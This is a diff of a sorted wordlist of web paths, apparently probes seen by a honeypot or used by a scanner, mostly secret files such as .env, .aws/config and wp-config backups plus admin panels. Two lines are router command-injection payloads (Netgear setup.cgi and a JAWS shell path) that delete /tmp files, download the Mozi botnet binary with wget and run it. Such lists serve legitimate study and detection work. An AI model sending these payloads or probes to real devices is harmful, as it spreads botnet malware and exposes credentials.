@@ -326,6 +326,7 @@ deploy/.env
 panel/.env
 public_html/.env
 wp-config.php.bak
+*
 .aws/config
 .env.2
 .env.docker
@@ -371,7 +372,6 @@ var/www/.env
 vendor/.env
 wp-admin/.env
 www/.git/config
-*
 +CSCOE+/logon.html
 .env.aws
 .env.prod.local
@@ -699,6 +699,7 @@ admin.php
 admin/login
 administrator
 adminpanel
+ads.txt
 api.ipinfo.io:443
 api/
 api/docs
@@ -836,7 +837,6 @@ administrator/phpMyAdmin/index.php?lang=en
 administrator/phpmyadmin/index.php?lang=en
 administrator/pma/index.php?lang=en
 administrator/web/index.php?lang=en
-ads.txt
 airflow.cfg
 api-docs/
 api/.env.local
@@ -1577,6 +1577,7 @@ settings
 settings.ini
 settings.tar.gz
 settings.zip
+setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm_DEFANGED+/tmp/*;wget+http://127.0.0.1:57919/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 setup.php
 shell?cd+/tmp;rm_DEFANGED+*;wget+http://127.0.0.1:41886/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
 signin
